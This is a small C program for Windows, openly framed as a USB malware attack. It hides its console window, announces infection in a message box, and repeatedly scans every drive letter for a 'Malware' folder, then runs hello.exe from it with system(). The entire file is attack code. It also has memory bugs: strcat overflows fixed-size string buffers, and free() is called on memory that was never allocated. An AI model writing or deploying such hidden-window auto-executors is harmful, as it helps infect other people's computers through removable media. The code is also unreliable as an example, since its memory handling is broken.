#include <stdio.h>
#include <string.h>
#include <io.h>
#include <windows.h>
						
int isFileOrDir(char* s) {
    _finddatai64_t c_file;
    intptr_t hFile;
    int result;
 
 
    if ((hFile = _findfirsti64(s, &c_file)) == -1L)
        result = -1; // 파일 또는 디렉토리가 없으면 -1 반환
    else
        if (c_file.attrib & _A_SUBDIR)
            result = 0; // 디렉토리면 0 반환
        else
            result = 1; // 그밖의 경우는 "존재하는 파일"이기에 1 반환
 
    _findclose(hFile);
    return result;
}

void hConsole(){
	HWND console = GetConsoleWindow();
	ShowWindow(console, SW_HIDE);
}

void USB_connect_attack(){
	char volums[26][16] = {
						"A:\\Malware", "B:\\Malware", "C:\\Malware", 
						"D:\\Malware", "E:\\Malware", "F:\\Malware", 
						"G:\\Malware", "H:\\Malware", "I:\\Malware", 
						"J:\\Malware", "K:\\Malware", "L:\\Malware", 
						"M:\\Malware", "N:\\Malware", "O:\\Malware", 
						"P:\\Malware", "Q:\\Malware", "R:\\Malware", 
						"S:\\Malware", "T:\\Malware", "U:\\Malware", 
						"V:\\Malware", "W:\\Malware", "X:\\Malware", 
						"Y:\\Malware", "Z:\\Malware"};
						
	char *target_volum = NULL;
	char *target_file = NULL;
	
	while(target_volum == NULL){
			
		for(int i = 0; i < 26; i++ ){
			if( isFileOrDir(volums[i]) == 0 ) {
				target_volum = volums[i];

				break;
			} 

		}
	}
	
	// malware program path
	target_file = strcat(target_volum, "\\hello.exe");
	// excute program
	system(target_file);
	free(target_volum);
	free(target_file);
}

int main() {
	hConsole();
	
	MessageBoxA(NULL, "Your PC is now infected with a USB attack", "INFO", 0);
	

	while(1){
		USB_connect_attack();
	}

	
}
